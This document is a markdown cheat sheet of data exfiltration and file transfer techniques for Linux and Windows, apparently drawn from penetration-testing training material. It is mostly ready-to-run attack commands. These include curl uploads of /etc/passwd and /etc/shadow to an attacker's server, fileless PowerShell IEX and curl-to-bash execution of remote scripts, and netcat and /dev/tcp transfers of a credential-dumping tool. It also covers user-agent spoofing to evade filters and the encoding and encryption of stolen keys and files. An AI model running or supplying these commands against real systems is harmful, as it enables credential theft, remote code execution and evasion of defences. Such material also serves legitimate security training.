# Data Exfiltration & File Transfer Methods

A comprehensive, structured cheat sheet and reference guide for file transfer, upload, download, and exfiltration techniques across Linux and Windows environments during security assessments.

---

## Table of Contents
1. [Web & HTTP/HTTPS Server Setups](#1-web--httphttps-server-setups)
   - [Nginx File Upload Server](#nginx-file-upload-server)
   - [Python Secure Upload Servers](#python-secure-upload-servers)
   - [WebDAV Server](#webdav-server)
2. [SMB & FTP Server Methods](#2-smb--ftp-server-methods)
   - [Impacket SMB Server](#impacket-smbserver)
   - [FTP Server (pyftpdlib)](#ftp-server-pyftpdlib)
3. [Windows File Transfer Techniques](#3-windows-file-transfer-techniques)
   - [PowerShell Downloads (File-based & Fileless)](#powershell-downloads-file-based--fileless)
   - [PowerShell Uploads](#powershell-uploads)
   - [User-Agent Spooling & Evasion](#user-agent-spooling--evasion)
4. [Linux & Living-off-the-Land (LotL) Methods](#4-linux--living-off-the-land-lotl-methods)
   - [Wget & Curl](#wget--curl)
   - [Pure Bash (/dev/tcp)](#pure-bash-devtcp)
   - [Netcat & Ncat](#netcat--ncat)
   - [SSH/SCP, WinRM, and RDP](#sshscp-winrm-and-rdp)
5. [Data Processing & Encryption](#5-data-processing--encryption)
   - [Base64 Encoding & Decoding](#base64-encoding--decoding)
   - [OpenSSL Symmetric Encryption](#openssl-symmetric-encryption)

---

## 1. Web & HTTP/HTTPS Server Setups

### Nginx File Upload Server
Configure an Nginx server to accept inbound file uploads via HTTP `PUT` requests.

1. **Create the target upload directory:**
   ```bash
   sudo mkdir -p /var/www/uploads/SecretUploadDirectory
   sudo chown -R www-data:www-data /var/www/uploads
   ```

2. **Configure the site block (`/etc/nginx/sites-available/upload.conf`):**
   ```nginx
   server {
       listen 9001;
       location /SecretUploadDirectory/ {
           root /var/www/uploads;
           dav_methods PUT;
       }
   }
   ```

3. **Enable configuration and restart service:**
   ```bash
   sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
   sudo rm /etc/nginx/sites-enabled/default
   sudo systemctl restart nginx.service
   ```

4. **Troubleshooting & Verification:**
   ```bash
   # Check active network ports
   ss -lnpt | grep 80
   
   # Verify running processes
   ps -ef | grep 2811
   
   # Inspect the latest error logs
   tail -2 /var/log/nginx/error.log
   ```

5. **Client-side upload execution:**
   ```bash
   curl -T /etc/passwd http://<IP>:9001/SecretUploadDirectory/
   ```

### Python Secure Upload Servers
#### Standard HTTP Upload Server
```bash
pip3 install uploadserver
python3 -m uploadserver
```

#### Encrypted HTTPS Upload Server
1. **Generate a self-signed certificate:**
   ```bash
   openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
   ```
2. **Launch the TLS upload listener:**
   ```bash
   sudo python3 -m pip install --user uploadserver
   sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
   ```
3. **Exfiltrate files over HTTPS (ignoring certificate warnings):**
   ```bash
   curl -X POST https://<IP>/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
   ```

### WebDAV Server
Useful for mounting shares over HTTP/HTTPS, bypassing restrictive firewalls by encapsulating SMB traffic.

```bash
# Installation
sudo pip3 install wsgidav cheroot

# Start anonymous WebDAV server
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous

# Interacting from Windows clients
dir \\192.168.49.128\DavWWWRoot
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
```

---

## 2. SMB & FTP Server Methods

### Impacket SMB Server
Quickly spawn an SMB share on an attack platform to interact with Windows targets.

```bash
# Unauthenticated SMB2 Share
sudo impacket-smbserver share -smb2support /tmp/smbshare

# Authenticated SMB2 Share
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test

# Client-side mounting and copying
net use n: \\192.168.220.133\share /user:test test
copy \\192.168.220.133\share\nc.exe C:\Users\Public\
copy n:\nc.exe C:\Users\Public\
```

### FTP Server (pyftpdlib)
A lightweight Python-based FTP server configuration.

```bash
# Installation
sudo pip3 install pyftpdlib

# Start read-only FTP server on port 21
sudo python3 -m pyftpdlib --port 21

# Start write-enabled FTP server (for uploads)
sudo python3 -m pyftpdlib --port 21 --write
```

#### Interactive FTP Automation (Scripted Client)
Create a command file named `ftpcommand.txt`:
```txt
open 192.168.49.128
USER anonymous
binary
GET file.txt
PUT c:\windows\system32\drivers\etc\hosts
bye
```
Execute the automated sequence silently:
```cmd
ftp -v -n -s:ftpcommand.txt
```

---

## 3. Windows File Transfer Techniques

### PowerShell Downloads (File-based & Fileless)

#### Standard File Download
```powershell
# Using WebClient
(New-Object Net.WebClient).DownloadFile('https://example.com/file.ps1', 'C:\Users\Public\Downloads\file.ps1')

# Using Invoke-WebRequest (IWR)
Invoke-WebRequest https://example.com/file.ps1 -OutFile PowerView.ps1
```

#### Fileless Execution (Memory Injection)
Directly pipe downloaded scripts into the expression evaluator (`IEX`), leaving no artifacts on disk.
```powershell
# WebClient DownloadString
IEX (New-Object Net.WebClient).DownloadString('https://example.com/payload.ps1')
(New-Object Net.WebClient).DownloadString('https://example.com/payload.ps1') | IEX

# Invoke-WebRequest Basic Parsing
Invoke-WebRequest https://<IP>/PowerView.ps1 -UseBasicParsing | IEX

# Scripted execution of remote utility
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
```

> **Bypassing TLS/SSL Certificate Validation:**
> Run this snippet inside PowerShell to ignore invalid or self-signed certificates on remote hosts:
> ```powershell
> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
> ```

### PowerShell Uploads
```powershell
# Uploading using a custom PSUpload utility script
Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts

# Direct Base64 POST Web Request
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```

### User-Agent Spooling & Evasion
Evade static network filtering policies by updating the PowerShell context to match trusted web browsers.

```powershell
# Enumerate built-in PowerShell User Agent strings
[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl

# Spoof Chrome User Agent on web request
$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```

---

## 4. Linux & Living-off-the-Land (LotL) Methods

### Wget & Curl
```bash
# Disk-bound Downloads
wget https://example.com/LinEnum.sh -O /tmp/LinEnum.sh
curl -o /tmp/LinEnum.sh https://example.com/LinEnum.sh

# Fileless Script Pipe
curl https://example.com/LinEnum.sh | bash
wget -qO- https://example.com/script.py | python3
```

### Pure Bash (/dev/tcp)
When standard binary utilities like `curl` or `wget` are unavailable or tightly restricted.

```bash
# Bind file descriptor 3 to a TCP connection
exec 3<>/dev/tcp/10.10.10.32/80

# Formulate and send an HTTP GET request
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3

# Capture raw response
cat <&3
```

### Netcat & Ncat
Efficient raw TCP communication pipes for unstructured binary or text serialization.

#### Target Acting as Receiver:
```bash
# Receiver configuration
nc -l -p 8000 > SharpKatz.exe
ncat -l -p 8000 --recv-only > SharpKatz.exe

# Sender configuration
nc -q 0 192.168.49.128 8000 < SharpKatz.exe
ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```

#### Target Acting as Sender (Inverted Flow):
```bash
# Sender configuration
sudo ncat -l -p 443 --send-only < SharpKatz.exe
sudo nc -l -p 443 -q 0 < SharpKatz.exe

# Receiver configuration
ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
nc 192.168.49.128 443 > SharpKatz.exe
cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```

### SSH/SCP, WinRM, and RDP
```bash
# Secure Copy Protocol (SCP)
scp username@192.168.49.128:/root/myroot.txt ./

# PowerShell Remoting (WinRM)
Test-NetConnection -ComputerName DATABASE01 -Port 5985
$Session = New-PSSession -ComputerName DATABASE01
Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session

# XfreeRDP Client Share Mount
xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
```

---

## 5. Data Processing & Encryption

### Base64 Encoding & Decoding
Safely transport binary content across pure text configurations, screens, or terminal interfaces.

#### Linux / Unix
```bash
# Encode
cat id_rsa | base64 -w 0; echo

# Decode
echo <base64_string> | base64 -d -w 0 > hosts
```

#### Windows PowerShell
```powershell
# Encode local file
[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))

# Decode raw string into byte sequence on disk
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("base64output"))
```

### OpenSSL Symmetric Encryption
Protect sensitive assets or exfiltration payloads using AES-256-CBC with Key Derivation.

```bash
# Encrypt file
openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc

# Decrypt file
openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd
```
